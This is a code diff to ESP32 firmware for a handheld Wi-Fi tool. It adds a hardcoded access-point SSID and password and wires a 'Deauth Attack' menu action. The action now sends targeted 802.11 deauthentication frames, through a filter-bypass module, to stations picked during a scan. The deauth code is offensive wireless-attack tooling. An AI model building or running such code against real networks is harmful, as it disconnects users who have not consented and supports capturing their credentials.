@@ -14,16 +14,24 @@
 #include "freertos/FreeRTOS.h"
 #include "freertos/task.h"
 
-#include "repl.h"
 #include "wifi.h"
 #include "user_interface.h"
-#include "conf.h"
 #include "wsl_bypasser.h"
 
 #include "lwip/err.h"
 #include "lwip/sockets.h"
 #include "lwip/sys.h"
 #include <lwip/netdb.h>
+
+#define TIMER_DELAY_MS 1000
+#define DEFAULT_SCAN_LIST_SIZE 16
+#define EXAMPLE_ESP_WIFI_SSID "Linksys-76fc"
+#define EXAMPLE_ESP_WIFI_CHANNEL 1
+#define EXAMPLE_ESP_WIFI_PASS "abcd1234"
+#define EXAMPLE_MAX_STA_CONN 1
+#define TCP_SERVER_PRIO 5
+#define TCP_SERVER_PORT 420
+#define TCP_SERVER_IP "192.168.4.1"
 
 #define MAC_LEN 6
 #define MAX_SSID_LEN 32
@@ -37,6 +45,7 @@
 #define TO_DS_MASK        0x1
 #define FROM_DS_BYTE      0x1
 #define FROM_DS_MASK      0x2
+#define MOUNT_PATH "/spiffs"
 
 static const char* TAG = "WIFI";
 
@@ -892,7 +901,7 @@ static void kill_pkt_sniffer(void)
 // REPL SCAN AP CMD
 //*****************************************************************************
 
-static int do_repl_scan_ap(int argc, char** argv)
+int do_repl_scan_ap(int argc, char** argv)
 {
     update_ap_info();
 
@@ -921,7 +930,7 @@ static void repl_scan_mac_time_cb(void* arg)
 
 } 
 
-static int do_repl_scan_mac_start(int argc, char** argv)
+int do_repl_scan_mac_start(int argc, char** argv)
 {
     if(argc != 2)
     {
@@ -958,7 +967,7 @@ static int do_repl_scan_mac_start(int argc, char** argv)
     return 0;
 }
 
-static int do_repl_scan_mac_stop(int argc, char** argv)
+int do_repl_scan_mac_stop(int argc, char** argv)
 {
     if(!gp_timer_running)
     {
@@ -986,7 +995,7 @@ static int do_repl_scan_mac_stop(int argc, char** argv)
 // REPL Deauth STA CMD
 //*****************************************************************************
 
-static int do_deauth(int argc, char** argv)
+int do_deauth(int argc, char** argv)
 {  
     if(argc != 2)
     {
@@ -1002,6 +1011,7 @@ static int do_deauth(int argc, char** argv)
 
     uint8_t i = (uint8_t) strtol(argv[1], NULL,10);
     wsl_bypasser_send_deauth_frame_targted(ap_info[active_mac_target_ap].bssid, (uint8_t*) &active_mac_list[i]);
+    ESP_LOGI(TAG, "DEAUTH SENT AP=%s STA="MACSTR, ap_info[active_mac_target_ap].bssid, MAC2STR((uint8_t*) &active_mac_list[i]));
 
     return 0;
 }
@@ -1330,7 +1340,12 @@ static void ui_scan_mac_cb(uint8_t index)
         // mac state. Kill the report rssi timer, reset screen and launch the
         // num macs timers
 
+        // Also here is where we send the deauth pkt
+
         stop_report_rssi_timer();
+
+        wsl_bypasser_send_deauth_frame_targted(ap_info[active_mac_target_ap].bssid, (uint8_t*) &active_mac_list[target_mac]);
+        ESP_LOGI(TAG, "DEAUTH SENT AP=%s STA="MACSTR, ap_info[active_mac_target_ap].bssid, MAC2STR((uint8_t*) &active_mac_list[target_mac]));
 
         lock_cursor();
         home_screen_pos();
@@ -1422,18 +1437,7 @@ void init_wifi(void)
 
     assert(xSemaphoreGive(active_mac_list_lock) == pdTRUE);
     assert(xSemaphoreGive(eapol_lock) == pdTRUE);
-}
 
-void register_wifi(void)
-{
-    register_no_arg_cmd("scan_ap", "Scan for all Wifi APs", &do_repl_scan_ap);
-    register_no_arg_cmd("scan_mac_start", "Start a scan of stations on an AP: sta_scan_start <ap_index from scan>", &do_repl_scan_mac_start);
-    register_no_arg_cmd("scan_mac_stop", "Stop a scan of stations on an AP", &do_repl_scan_mac_stop);
-    register_no_arg_cmd("deauth", "Send Deauth Pkt to Active while scanner running", &do_deauth);
-}
-
-void ui_add_wifi(void)
-{
     add_ui_cmd("Scan AP", ui_scan_ap_ini, ui_scan_ap_cb, ui_scan_ap_fini);
     add_ui_cmd("Deauth Attack", ui_scan_mac_ini, ui_scan_mac_cb, ui_scan_mac_fini);
 }
